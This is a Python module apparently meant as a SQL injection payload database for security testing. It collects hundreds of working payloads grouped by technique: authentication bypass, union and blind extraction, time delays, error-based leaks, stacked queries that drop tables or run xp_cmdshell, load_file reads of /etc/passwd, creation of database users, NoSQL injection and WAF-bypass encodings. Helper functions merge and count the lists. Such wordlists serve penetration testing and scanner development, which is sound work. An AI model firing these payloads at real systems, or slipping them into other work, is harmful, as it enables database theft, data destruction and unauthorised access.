"""
SQL Injection Payloads Database
Contains comprehensive SQL injection payloads for testing purposes.
"""

# Basic injection payloads
BASIC_PAYLOADS = [
    "'",
    "''",
    "`",
    "``",
    '"',
    '""',
    "\\",
    "\\\\",
]

# Boolean-based blind SQL injection payloads
BOOLEAN_BLIND_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "') OR '1'='1--",
    "') OR ('1'='1--",
    "admin' or 1=1#",
    "admin' or '1'='1",
    "admin' or '1'='1'--",
    "admin' or '1'='1'#",
    "admin' or '1'='1'/*",
    "or 1=1--",
    "or 1=1#",
    "or 1=1/*",
    "') or ('1'='1",
    "') or ('1'='1'--",
    "') or ('1'='1'#",
    ") or ('a'='a",
    ") or ('x'='x",
    "? or 1=1 --",
    "or 2 between 1 and 3",
    "or 'unusual'='unusual'",
    "or 'text' > 't'",
    "or 'whatever' in ('whatever')",
    "or 1 in (select @@version) --",
    "or username like '%",
    "or user like '%",
    "or userid like '%",
    "or 'a'='a",
    "or 3=3",
    "or 2>1",
    "or true--",
    "or ''=''",
    "or 1 --'",
]

# Union-based SQL injection payloads
UNION_BASED_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION ALL SELECT NULL--",
    "' UNION ALL SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "1 union all select 1,2,3,4,5,6,name from sysobjects where xtype='u' --",
    "' UNION SELECT 1,@@version,3#",
    "' UNION SELECT 1,version(),3--",
    "' UNION SELECT 1,@@version,3--",
    "' UNION SELECT 1,banner,3 FROM v$version--",
    "' union select 1,version(),3--",
    "' union select null,@@version,null--",
    "' union select 1,user(),3--",
    "' union select 1,database(),3--",
    "' union select null,version(),null--",
    "' union select 1,current_user,3--",
    "' union select 1,current_database(),3--",
    "' union select null,@@version,null--",
    "' union select 1,system_user,3--",
    "' union select 1,db_name(),3--",
    "' union select null,banner,null from v$version--",
    "' union select 1,user,3 from dual--",
]

# Time-based blind SQL injection payloads
TIME_BASED_PAYLOADS = [
    "'; WAITFOR DELAY '00:00:05'--",
    "'; SELECT SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe",
    "1 or pg_sleep(__TIME__) --",
    "1) or pg_sleep(__TIME__) --",
    "1)) or pg_sleep(__TIME__) --",
    "' or pg_sleep(__TIME__) --",
    "') or pg_sleep(__TIME__) --",
    "')) or pg_sleep(__TIME__) --",
    "1 or sleep(__TIME__) #",
    "' or sleep(__TIME__) #",
    "1) or sleep(__TIME__) #",
    "') or sleep(__TIME__) #",
    "1 waitfor delay '0:0:10'--",
    "'; waitfor delay '0:0:__TIME__'--",
    "') waitfor delay '0:0:__TIME__'--",
    "if(1=1,sleep(5),0)",
    "if(1=2,sleep(5),0)",
    "case when (1=1) then sleep(5) else 0 end",
    "case when (1=2) then sleep(5) else 0 end",
    "benchmark(10000000,MD5(1))",
    "' or benchmark(10000000,MD5(1)) #",
    "1) or benchmark(10000000,MD5(1)) #",
]

# Error-based SQL injection payloads
ERROR_BASED_PAYLOADS = [
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e))--",
    "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
    "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
    "' and extractvalue(1,concat(0x7e,(select version()),0x7e))--",
    "' and updatexml(1,concat(0x7e,(select version()),0x7e),1)--",
    "' AND (SELECT version()) IS NOT NULL--",
    "' AND (SELECT @@version) IS NOT NULL--",
    "' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
]

# Stacked queries payloads
STACKED_QUERIES_PAYLOADS = [
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES('hacker','password')--",
    "'; UPDATE users SET password='hacked' WHERE id=1--",
    "; exec xp_cmdshell 'ping 10.10.1.2'--",
    "; exec master..xp_cmdshell 'ping 10.10.1.2'--",
    "exec sp",
    "exec xp",
    "exec master..xp_cmdshell",
    "procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)",
]

# Database-specific payloads
MYSQL_PAYLOADS = [
    "' OR 1=1#",
    "' UNION SELECT 1,@@version,3#",
    "' AND (SELECT SUBSTRING(@@version,1,1))='5'--",
    "' union select 1,version(),3--",
    "' union select null,@@version,null--",
    "' union select 1,user(),3--",
    "' union select 1,database(),3--",
]

POSTGRESQL_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT 1,version(),3--",
    "' AND (SELECT version()) IS NOT NULL--",
    "' union select null,version(),null--",
    "' union select 1,current_user,3--",
    "' union select 1,current_database(),3--",
]

MSSQL_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT 1,@@version,3--",
    "' AND (SELECT @@version) IS NOT NULL--",
    "' union select null,@@version,null--",
    "' union select 1,system_user,3--",
    "' union select 1,db_name(),3--",
]

ORACLE_PAYLOADS = [
    "' OR 1=1--",
    "' UNION SELECT 1,banner,3 FROM v$version--",
    "' AND (SELECT banner FROM v$version WHERE rownum=1) IS NOT NULL--",
    "' union select null,banner,null from v$version--",
    "' union select 1,user,3 from dual--",
]

# NoSQL injection payloads
NOSQL_PAYLOADS = [
    "' || '1'=='1",
    "' && '1'=='1",
    "'; return true; //",
    "' || true || '",
    "[$ne]=1",
    "[$regex]=.*",
    "[$where]=1",
]

# Encoded payloads
ENCODED_PAYLOADS = [
    "%27%20OR%201=1--",
    "%27%20UNION%20SELECT%201,2,3--",
    "&#39; OR 1=1--",
    "&#x27; OR 1=1--",
    "\\x27UNION SELECT",
    "char(39)",
    "char(39)+char(39)",
    "CHR(39)",
    "CHR(39)||CHR(39)",
]

# Comment-based payloads
COMMENT_PAYLOADS = [
    "/**/or/**/1/**/=/**/1",
    "//",
    "#",
    "-- ",
    "/*",
    "*/",
    "having 1=1--",
    "group by userid having 1=1--",
    "order by 1--",
    "order by 1,2--",
    "order by 1,2,3--",
]

# Information gathering payloads
INFO_GATHERING_PAYLOADS = [
    "select * from information_schema.tables--",
    "select * from information_schema.columns--",
    "select table_name from information_schema.tables--",
    "select column_name from information_schema.columns--",
    "select name from syscolumns where id=(select id from sysobjects where name=tablename') --",
    "1; (load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",
    "declare @s varchar(200) select @s=0x73656c65637420404076657273696f6e exec(@s)",
    "insert into mysql.user (user, host, password) values ('name', 'localhost', password('pass123'))",
    "create user name identified by pass123 temporary tablespace temp default tablespace users;",
]

# Blind injection techniques
BLIND_INJECTION_PAYLOADS = [
    "1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",
    "1 and user_name() = 'dbo'",
    "1 and 1=(select count(*) from tablenames)",
    "x' and 1=(select count(*) from tabname); --",
    "x' AND userid IS NULL; --",
    "x' AND email IS NULL; --",
    "x' AND members.email IS NULL; --",
]

# File operations payloads
FILE_OPERATION_PAYLOADS = [
    "union select load_file('/etc/passwd'),1,1,1;",
    "union select 1,load_file('/etc/passwd'),1,1;",
    "' union select load_file('/etc/passwd') --",
]

# Advanced payloads
ADVANCED_PAYLOADS = [
    "select * from users where id='1' or 1=1 union select 1,version() -- 1'",
    "select * from users where id=1 or 1=1 -- 1",
    "1 and ascii(lower(substring((select top 1 name from sysobjects where xtype='u'), 1, 1))) > 116",
    "1 and user_name() = 'dbo'",
    "1 and 1=(select count(*) from tablenames)",
    "x' and 1=(select count(*) from tabname); --",
    "x' AND userid IS NULL; --",
    "x' AND email IS NULL; --",
    "x' AND members.email IS NULL; --",
]

# WAF bypass payloads
WAF_BYPASS_PAYLOADS = [
    "/*!50000UNION*//*!50000SELECT*/",
    "/*!UNION*//*!SELECT*/",
    "/**/UNION/**/SELECT/**/",
    "UNION/**/SELECT",
    "UNION(SELECT",
    "UNION%20SELECT",
    "UNION%0ASELECT",
    "UNION%0DSELECT",
    "UNION%0D%0ASELECT",
    "UNION%09SELECT",
    "UNION%0BSELECT",
    "UNION%0CSELECT",
    "UNION%A0SELECT",
    "UNI%00ON",
    "UN%00ION",
    "%55NION",
    "%53ELECT",
]

def get_all_payloads():
    """
    Returns all SQL injection payloads combined from all categories.
    
    Returns:
        list: Complete list of SQL injection payloads
    """
    all_payloads = []
    
    # Combine all payload categories
    payload_categories = [
        BASIC_PAYLOADS,
        BOOLEAN_BLIND_PAYLOADS,
        UNION_BASED_PAYLOADS,
        TIME_BASED_PAYLOADS,
        ERROR_BASED_PAYLOADS,
        STACKED_QUERIES_PAYLOADS,
        MYSQL_PAYLOADS,
        POSTGRESQL_PAYLOADS,
        MSSQL_PAYLOADS,
        ORACLE_PAYLOADS,
        NOSQL_PAYLOADS,
        ENCODED_PAYLOADS,
        COMMENT_PAYLOADS,
        INFO_GATHERING_PAYLOADS,
        BLIND_INJECTION_PAYLOADS,
        FILE_OPERATION_PAYLOADS,
        ADVANCED_PAYLOADS,
        WAF_BYPASS_PAYLOADS,
    ]
    
    for category in payload_categories:
        all_payloads.extend(category)
    
    # Remove duplicates while preserving order
    seen = set()
    unique_payloads = []
    for payload in all_payloads:
        if payload not in seen:
            seen.add(payload)
            unique_payloads.append(payload)
    
    return unique_payloads

def get_payloads_by_category():
    """
    Returns payloads organized by category.
    
    Returns:
        dict: Dictionary with category names as keys and payload lists as values
    """
    return {
        'basic': BASIC_PAYLOADS,
        'boolean_blind': BOOLEAN_BLIND_PAYLOADS,
        'union_based': UNION_BASED_PAYLOADS,
        'time_based': TIME_BASED_PAYLOADS,
        'error_based': ERROR_BASED_PAYLOADS,
        'stacked_queries': STACKED_QUERIES_PAYLOADS,
        'mysql': MYSQL_PAYLOADS,
        'postgresql': POSTGRESQL_PAYLOADS,
        'mssql': MSSQL_PAYLOADS,
        'oracle': ORACLE_PAYLOADS,
        'nosql': NOSQL_PAYLOADS,
        'encoded': ENCODED_PAYLOADS,
        'comment': COMMENT_PAYLOADS,
        'info_gathering': INFO_GATHERING_PAYLOADS,
        'blind_injection': BLIND_INJECTION_PAYLOADS,
        'file_operations': FILE_OPERATION_PAYLOADS,
        'advanced': ADVANCED_PAYLOADS,
        'waf_bypass': WAF_BYPASS_PAYLOADS,
    }

def get_payload_stats():
    """
    Returns statistics about the payload database.
    
    Returns:
        dict: Statistics including total count and category breakdown
    """
    categories = get_payloads_by_category()
    total_payloads = len(get_all_payloads())
    
    stats = {
        'total_payloads': total_payloads,
        'categories': {name: len(payloads) for name, payloads in categories.items()},
        'category_count': len(categories)
    }
    
    return stats

# Example usage and testing
if __name__ == "__main__":
    print("SQL Injection Payloads Database")
    print("=" * 40)
    
    stats = get_payload_stats()
    print(f"Total Payloads: {stats['total_payloads']}")
    print(f"Categories: {stats['category_count']}")
    print("\nCategory Breakdown:")
    
    for category, count in stats['categories'].items():
        print(f"  {category.replace('_', ' ').title()}: {count}")
    
    print("\nSample Payloads:")
    sample_payloads = get_all_payloads()[:10]
    for i, payload in enumerate(sample_payloads, 1):
        print(f"  {i}: {payload}")
